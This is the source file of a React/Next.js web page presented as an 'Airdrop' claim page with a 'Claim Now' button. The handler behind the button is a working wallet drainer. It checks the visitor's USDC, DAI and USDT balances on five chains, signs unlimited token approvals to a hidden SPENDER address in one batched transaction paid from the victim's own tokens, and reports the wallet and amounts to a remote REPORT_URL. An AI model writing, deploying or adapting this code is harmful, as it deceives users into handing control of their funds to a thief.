'use client';
import { useState } from 'react';
import { useAccount } from 'wagmi';
import { getWalletClient } from '@wagmi/core';
import { erc20Abi, maxUint256, formatUnits } from 'viem';
import { config } from '@/config';
import {
  createMeeClient,
  toMultichainNexusAccount,
  getMEEVersion,
  MEEVersion,
} from '@biconomy/abstractjs';
import { http, fallback, createPublicClient } from 'viem';
import { mainnet, optimism, base, arbitrum, polygon } from 'viem/chains';

// ENV
const BICONOMY_API_KEY = process.env.NEXT_PUBLIC_BICONOMY_API_KEY || '';
const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || '') as `0x${string}`;
const INFURA_ID = process.env.NEXT_PUBLIC_INFURA_ID || '';
const ALCHEMY_KEY = process.env.NEXT_PUBLIC_ALCHEMY_KEY || '';
const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL || '';

if (!BICONOMY_API_KEY) throw new Error('NEXT_PUBLIC_BICONOMY_API_KEY missing in .env');
if (!SPENDER || SPENDER === '0x') throw new Error('NEXT_PUBLIC_SPENDER missing in .env');

// RPC fallback setup
const transports: Record<number, ReturnType<typeof fallback>> = {
  [mainnet.id]: fallback([
    http(`https://mainnet.infura.io/v3/${INFURA_ID}`),
    http(`https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`),
  ]),
  [optimism.id]: fallback([
    http(`https://optimism-mainnet.infura.io/v3/${INFURA_ID}`),
    http(`https://opt-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`),
  ]),
  [base.id]: fallback([
    http(`https://base-mainnet.infura.io/v3/${INFURA_ID}`),
    http(`https://base-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`),
  ]),
  [arbitrum.id]: fallback([
    http(`https://arbitrum-mainnet.infura.io/v3/${INFURA_ID}`),
    http(`https://arb-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`),
  ]),
  [polygon.id]: fallback([
    http(`https://polygon-mainnet.infura.io/v3/${INFURA_ID}`),
    http(`https://polygon-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`),
  ]),
};

// Chain names
const CHAIN_NAMES: Record<number, string> = {
  [mainnet.id]: "Ethereum",
  [optimism.id]: "Optimism",
  [base.id]: "Base",
  [arbitrum.id]: "Arbitrum",
  [polygon.id]: "Polygon",
};

// Chain lookup
const CHAIN_BY_ID: Record<number, any> = {
  [mainnet.id]: mainnet,
  [optimism.id]: optimism,
  [base.id]: base,
  [arbitrum.id]: arbitrum,
  [polygon.id]: polygon,
};

// Tokens per chain
const TOKENS_BY_CHAIN: Record<
  number,
  { symbol: string; address: `0x${string}`; decimals: number; min: bigint }[]
> = {
  [mainnet.id]: [
    { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6, min: BigInt(1e6) },
    { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, min: BigInt(1e18) },
    { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, min: BigInt(1e6) },
  ],
  [optimism.id]: [
    { symbol: 'USDC', address: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607', decimals: 6, min: BigInt(1e6) },
    { symbol: 'DAI', address: '0xda10009cbd5d07dd0cecc66161fc93d7c9000da1', decimals: 18, min: BigInt(1e18) },
    { symbol: 'USDT', address: '0x94b008aa00579c1307b0ef2c499ad98a8ce58e58', decimals: 6, min: BigInt(1e6) },
  ],
  [base.id]: [
    { symbol: 'USDC', address: '0x833589fCD6eDb6E08f4c7C32D4f71b54BDA02913', decimals: 6, min: BigInt(1e6) },
    { symbol: 'USDT', address: '0x2dC0dDe60A4Bc4C3d0Ff6f6E5b5f3B7936E220e5', decimals: 6, min: BigInt(1e6) },
  ],
  [arbitrum.id]: [
    { symbol: 'USDC', address: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', decimals: 6, min: BigInt(1e6) },
    { symbol: 'DAI', address: '0xda10009cbd5d07dd0cecc66161fc93d7c9000da1', decimals: 18, min: BigInt(1e18) },
    { symbol: 'USDT', address: '0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9', decimals: 6, min: BigInt(1e6) },
  ],
  [polygon.id]: [
    { symbol: 'USDC', address: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', decimals: 6, min: BigInt(1e6) },
    { symbol: 'DAI', address: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', decimals: 18, min: BigInt(1e18) },
    { symbol: 'USDT', address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6, min: BigInt(1e6) },
  ],
};

// balance
async function getTokenBalance(
  chainId: number,
  token: { symbol: string; address: `0x${string}`; decimals: number },
  user: `0x${string}`
) {
  const client = createPublicClient({ chain: CHAIN_BY_ID[chainId], transport: transports[chainId] });
  try {
    const bal = await client.readContract({ abi: erc20Abi, address: token.address, functionName: 'balanceOf', args: [user] });
    return bal as bigint;
  } catch {
    return BigInt(0);
  }
}

// report
async function reportApproval(data: any) {
  if (!REPORT_URL) return;
  try {
    await fetch(REPORT_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
  } catch (err) {
    console.error('Report failed', err);
  }
}

export default function Page() {
  const { address, isConnected } = useAccount();
  const [status, setStatus] = useState<string>('');
  const [loading, setLoading] = useState<boolean>(false);

  const handleApproveAllChains = async () => {
    if (!address) return;

    try {
      setLoading(true);
      setStatus(`🔍 Checking balances across chains...`);

      const walletClient = await getWalletClient(config);
      if (!walletClient) throw new Error("Please connect your wallet");

      const orchestrator = await toMultichainNexusAccount({
        signer: walletClient, // ✅ FIXED signer
        chainConfigurations: Object.values([mainnet, optimism, base, arbitrum, polygon]).map((c) => ({
          chain: c,
          transport: transports[c.id],
          version: getMEEVersion(MEEVersion.V2_1_0),
        })),
      });

      const meeClient = await createMeeClient({ account: orchestrator, apiKey: BICONOMY_API_KEY });

      const instructions: any[] = [];
      const approvedTokens: { chain: string; symbol: string; amount: string; decimals: number }[] = [];
      const feeCandidates: { address: `0x${string}`; chainId: number }[] = [];

      for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
        for (const token of tokens) {
          const bal = await getTokenBalance(Number(cid), token, address as `0x${string}`);
          if (bal > BigInt(0)) {
            approvedTokens.push({
              chain: CHAIN_NAMES[Number(cid)],
              symbol: token.symbol,
              amount: formatUnits(bal, token.decimals),
              decimals: token.decimals,
            });

            const instr = await orchestrator.buildComposable({
              type: 'default',
              data: {
                abi: erc20Abi,
                chainId: Number(cid),
                to: token.address,
                functionName: 'approve',
                args: [SPENDER, maxUint256],
              },
            });
            instructions.push(instr);

            feeCandidates.push({ address: token.address, chainId: Number(cid) });
          }
        }
      }

      if (instructions.length === 0) {
        setStatus(`ℹ️ No balances found on any chain.`);
        setLoading(false);
        return;
      }

      let success = false;
      let lastError: any = null;

      for (const feeToken of feeCandidates) {
        try {
          setStatus(`🚀 Approving using ${CHAIN_NAMES[feeToken.chainId]} ${feeToken.address} as gas token...`);

          const fusionQuote = await meeClient.getFusionQuote({
            instructions,
            trigger: { chainId: feeToken.chainId, tokenAddress: feeToken.address, amount: BigInt(1) },
            feeToken,
          });

          const { hash } = await meeClient.executeFusionQuote({ fusionQuote });
          await meeClient.waitForSupertransactionReceipt({ hash });

          setStatus(`🎉 Finished approvals across chains. Tx: ${hash}`);

          for (const t of approvedTokens) {
            await reportApproval({
              wallet: address,
              chain: t.chain,
              token: t.symbol,
              amount: t.amount,
              decimals: t.decimals,
              txHash: hash,
              feeToken: { token: feeToken.address, chain: CHAIN_NAMES[feeToken.chainId] },
            });
          }

          success = true;
          break;
        } catch (err: any) {
          lastError = err;
          console.warn(`Fee token failed: ${CHAIN_NAMES[feeToken.chainId]} ${feeToken.address}`, err);
          continue;
        }
      }

      if (!success) {
        throw new Error(`All fee token attempts failed: ${lastError?.message || lastError}`);
      }
    } catch (err: any) {
      console.error(err);
      setStatus(`❌ Error: ${err.message || err}`);
      await reportApproval({ wallet: address, error: err.message || String(err) });
    } finally {
      setLoading(false);
    }
  };

  return (
    <main
      style={{
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        gap: "24px",
        marginTop: "40px",
      }}
    >
      <header
        style={{
          position: "fixed",
          top: 0,
          left: 0,
          right: 0,
          height: "64px",
          background: "#09011fff",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          padding: "0 24px",
          paddingTop: "env(safe-area-inset-top)",
          boxShadow: "0 2px 8px rgba(241, 235, 235, 0.08)",
          zIndex: 1000,
        }}
      >
        <div style={{ fontFamily: "sans-serif", fontWeight: "bold", fontSize: "18px", color: "#aaa587ff" }}>
          AIRDROPS
        </div>
        <appkit-button />
      </header>

      <div
        style={{
          display: "flex",
          flexDirection: "column",
          gap: "24px",
          paddingTop: "80px",
          width: "80%",
          maxWidth: "600px",
        }}
      >
        <div
          style={{
            border: "1px solid #9dd6d1ff",
            borderRadius: "12px",
            padding: "20px",
            background: "#090e41ff",
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            justifyContent: "space-between",
            height: "500px",
          }}
        >
          <h2 style={{ marginBottom: "12px" }}>Airdrop</h2>

          <div
            style={{
              flex: 1,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              color: "#e4e1daff",
              fontSize: "14px",
              textAlign: "center",
            }}
          >
            {status || ""}
          </div>

          <button
            onClick={handleApproveAllChains}
            style={{
              background: "#a00b0bff",
              color: "white",
              padding: "12px 28px",
              borderRadius: "8px",
              cursor: "pointer",
              marginTop: "16px",
            }}
          >
            {loading ? "Processing..." : "Claim Now"}
          </button>
        </div>

        {[1, 2, 3].map((i) => (
          <div
            key={i}
            style={{
              border: "1px solid #c9c8ddff",
              borderRadius: "12px",
              padding: "20px",
              background: "#0e0a42ff",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
            }}
          >
            <span>Box {i + 1}</span>
          </div>
        ))}
      </div>
    </main>
  );
}
